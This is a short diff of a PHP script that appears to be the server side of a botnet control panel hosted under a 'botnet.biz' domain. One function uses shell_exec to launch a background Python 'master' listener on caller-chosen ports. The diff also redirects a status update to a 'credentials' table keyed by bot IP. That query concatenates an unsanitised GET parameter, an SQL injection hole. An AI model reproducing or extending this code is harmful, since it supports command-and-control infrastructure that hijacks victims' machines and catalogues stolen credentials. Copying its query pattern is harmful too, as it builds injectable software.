@@ -90,7 +90,7 @@ function outputQueryResults($mysqli) {
 
 function spawnTheMaster($array){
 
-	shell_exec('nohup /usr/bin/python3 /var/www/ports.botnet.biz/web/master.py -m 0.0.0.0:'.$array["port"].' -c 0.0.0.0:'.$array["connection_port"].' > /dev/null 2>&1 &');
+	shell_exec('nohup /usr/bin/python3 /var/www/underground.botnet.biz/web/www/master.py -m 0.0.0.0:'.$array["port"].' -c 0.0.0.0:'.$array["connection_port"].' > /dev/null 2>&1 &');
 }
  
 
@@ -105,7 +105,7 @@ if (!$_GET["status"]){
 	spawnTheMaster($portArray);
 } else {
 
-	$sql = "UPDATE ports SET status = '".$_GET["status"]."', last_online = '".date("d-m-Y H:i:s", time())."' WHERE ip = '".$ip."';";
+	$sql = "UPDATE credentials SET status = '".$_GET["status"]."', last_online = '".date("d-m-Y H:i:s", time())."' WHERE ip = '".$ip."';";
 
 
 	if (!$result = $mysqli->query($sql)) {
